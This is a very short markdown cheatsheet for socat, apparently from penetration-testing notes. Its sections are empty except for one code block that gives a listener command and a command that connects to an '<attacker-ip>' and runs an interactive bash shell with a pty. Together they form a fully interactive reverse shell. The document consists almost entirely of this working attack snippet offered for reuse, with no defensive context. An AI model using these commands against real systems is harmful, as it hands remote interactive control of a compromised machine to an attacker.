
# Socat Cheatsheet

## Basics

---

## Usage


## Examples

```bash
# Set up the listener
socat TCP-L:<port> FILE:`tty`,raw,echo=0

# Connect to the listener
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
